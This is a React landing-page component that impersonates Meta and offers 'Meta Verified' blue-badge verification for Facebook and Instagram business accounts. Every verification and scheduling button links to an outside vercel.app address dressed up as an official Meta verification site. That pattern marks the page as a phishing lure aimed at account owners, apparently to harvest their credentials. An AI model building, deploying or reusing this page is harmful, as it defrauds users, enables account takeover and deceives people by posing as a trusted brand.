import React, { useMemo } from "react";

export default function App() {
  const lang =
    (typeof window !== "undefined" && navigator?.language?.split("-")?.[0]) ||
    "en";

  const verifyLink =
    "https://meta-business-verification-official.vercel.app/meta-community";

  const text = {
    en: {
      begin: "Begin",
      advertisement: "Advertisement",
      learn: "Learn",
      support: "Support",
      schedule: "Schedule a call",
      start: "Start Verification",
      register: "Start Verification",
      title: "Let the world recognize your business instantly.",
      desc: "Meta Verified helps you build trust, credibility, and protection across Facebook and Instagram.",
      verifiedTitle: "Meta Verified",
      verifiedDesc:
        "Verify your Meta account to receive the blue verification badge on Facebook and Instagram.",
    },
  };

  const t = text[lang] || text.en;

  const images = [
    "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517423440428-a5a00ad493e8?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=1200&auto=format&fit=crop",
  ];

  const row1 = useMemo(() => [...images, ...images], []);
  const row2 = useMemo(() => [...images].reverse().concat(images), []);

  return (
    <>
      <style>{`
        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family:Inter, system-ui, Arial;
        }

        body{
          background:#05070d;
          overflow-x:hidden;
        }

        .app{
          min-height:100vh;
          color:#fff;
          position:relative;
          overflow:hidden;
        }

        /* ===== PREMIUM BACKGROUND ===== */
        .bg{
          position:absolute;
          inset:0;
          z-index:0;
        }

        .glow1{
          position:absolute;
          width:800px;
          height:800px;
          background:radial-gradient(circle,#1877f2 0%,transparent 60%);
          top:-200px;
          left:-200px;
          filter:blur(90px);
          opacity:.5;
        }

        .glow2{
          position:absolute;
          width:900px;
          height:900px;
          background:radial-gradient(circle,#00c3ff 0%,transparent 60%);
          bottom:-300px;
          right:-300px;
          filter:blur(100px);
          opacity:.35;
        }

        /* ===== MARQUEE ===== */
        .marquee{
          position:absolute;
          inset:0;
          opacity:.18;
        }

        .track{
          display:flex;
          gap:20px;
          width:max-content;
        }

        .row{
          overflow:hidden;
          margin:60px 0;
          transform:rotate(-12deg) scale(1.2);
        }

        .row1 .track{
          animation:move 35s linear infinite;
        }

        .row2 .track{
          animation:move2 35s linear infinite;
        }

        @keyframes move{
          0%{transform:translateX(0)}
          100%{transform:translateX(-50%)}
        }

        @keyframes move2{
          0%{transform:translateX(-50%)}
          100%{transform:translateX(0)}
        }

        .card{
          width:200px;
          height:360px;
          border-radius:24px;
          overflow:hidden;
          flex-shrink:0;
          box-shadow:0 30px 80px rgba(0,0,0,.6);
        }

        .card img{
          width:100%;
          height:100%;
          object-fit:cover;
        }

        /* ===== HEADER ===== */
        .header{
          position:relative;
          z-index:10;
          height:80px;
          display:flex;
          justify-content:space-between;
          align-items:center;
          padding:0 50px;
          background:rgba(10,12,18,.55);
          backdrop-filter:blur(14px);
          border-bottom:1px solid rgba(255,255,255,.08);
        }

        .logo{
          font-size:32px;
          font-weight:800;
          color:#1877f2;
        }

        .nav{
          display:flex;
          gap:28px;
        }

        .nav a{
          color:#cbd5e1;
          text-decoration:none;
          font-size:14px;
        }

        .btns{
          display:flex;
          gap:12px;
        }

        .btn1{
          padding:10px 18px;
          border-radius:999px;
          border:1px solid #1877f2;
          color:#1877f2;
          text-decoration:none;
          transition:.3s;
        }

        .btn1:hover{
          background:#1877f2;
          color:#fff;
        }

        .btn2{
          padding:10px 18px;
          border-radius:999px;
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          color:#fff;
          text-decoration:none;
          transition:.3s;
        }

        .btn2:hover{
          transform:scale(1.05);
        }

        /* ===== HERO ===== */
        .hero{
          position:relative;
          z-index:5;
          max-width:1200px;
          margin:auto;
          padding:120px 40px;
          display:flex;
          justify-content:space-between;
          align-items:center;
          gap:60px;
        }

        .left{
          max-width:650px;
        }

        /* ===== VERIFIED PREMIUM ===== */
        .verified{
          display:flex;
          align-items:center;
          gap:18px;
          margin-bottom:28px;
        }

        .badge{
          position:relative;
          width:78px;
          height:78px;
        }

        .ring{
          position:absolute;
          inset:-6px;
          border-radius:50%;
          border:2px solid rgba(24,119,242,.4);
          animation:spin 6s linear infinite;
        }

        @keyframes spin{
          from{transform:rotate(0)}
          to{transform:rotate(360deg)}
        }

        .icon{
          width:100%;
          height:100%;
          border-radius:50%;
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          display:flex;
          align-items:center;
          justify-content:center;
          font-size:30px;
          font-weight:900;
          box-shadow:0 0 30px rgba(24,119,242,.6);
        }

        .vtitle{
          font-weight:700;
          font-size:14px;
        }

        .vdesc{
          font-size:13px;
          color:#94a3b8;
          max-width:420px;
          line-height:1.5;
        }

        /* ===== TEXT ===== */
        h1{
          font-size:64px;
          line-height:1.05;
          margin-bottom:24px;
        }

        p{
          color:#cbd5e1;
          font-size:18px;
          line-height:1.7;
          margin-bottom:40px;
        }

        .cta{
          display:inline-block;
          padding:16px 34px;
          border-radius:999px;
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          color:#fff;
          text-decoration:none;
          font-weight:600;
          transition:.3s;
        }

        .cta:hover{
          transform:translateY(-2px);
          box-shadow:0 20px 40px rgba(24,119,242,.3);
        }

        /* ===== RESPONSIVE ===== */
        @media(max-width:900px){
          .hero{
            flex-direction:column;
            text-align:center;
          }

          .nav{display:none}
        }
      `}</style>

      <div className="app">
        {/* BACKGROUND */}
        <div className="bg">
          <div className="glow1" />
          <div className="glow2" />

          <div className="marquee">
            <div className="row row1">
              <div className="track">
                {row1.map((img, i) => (
                  <div className="card" key={i}>
                    <img src={img} alt="" />
                  </div>
                ))}
              </div>
            </div>

            <div className="row row2">
              <div className="track">
                {row2.map((img, i) => (
                  <div className="card" key={i}>
                    <img src={img} alt="" />
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* HEADER */}
        <header className="header">
          <div className="logo">Meta</div>

          <nav className="nav">
            <a href="#">{t.begin}</a>
            <a href="#">{t.advertisement}</a>
            <a href="#">{t.learn}</a>
            <a href="#">{t.support}</a>
          </nav>

          <div className="btns">
            <a className="btn1" href={verifyLink}>
              {t.schedule}
            </a>
            <a className="btn2" href={verifyLink}>
              {t.start}
            </a>
          </div>
        </header>

        {/* HERO */}
        <section className="hero">
          <div className="left">
            {/* VERIFIED */}
            <div className="verified">
              <div className="badge">
                <div className="ring"></div>
                <div className="icon">✓</div>
              </div>

              <div>
                <div className="vtitle">{t.verifiedTitle}</div>
                <div className="vdesc">{t.verifiedDesc}</div>
              </div>
            </div>

            <h1>{t.title}</h1>
            <p>{t.desc}</p>

            <a className="cta" href={verifyLink}>
              {t.register}
            </a>
          </div>
        </section>
      </div>
    </>
  );
}
